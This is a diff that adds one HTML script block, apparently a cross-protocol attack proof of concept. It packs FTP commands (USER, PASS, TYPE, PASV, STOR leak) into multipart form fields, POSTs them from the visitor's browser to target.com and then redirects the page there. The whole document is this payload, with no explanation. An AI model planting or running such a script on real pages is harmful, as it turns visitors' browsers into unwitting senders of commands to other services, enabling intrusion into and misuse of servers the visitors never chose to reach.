@@ -1,0 +1,16 @@
+<script>
+    var formData = new FormData();
+    formData.append("a", "USER bob");
+    formData.append("b", "PASS 12345");
+    formData.append("b", "TYPE I");
+    formData.append("c", "PASV");
+    formData.append("d", "STOR leak");
+
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://target.com");
+    xhr.send(formData);
+
+    setTimeout(function() {
+        window.location = "https://target.com";
+    }, 5000);
+</script>
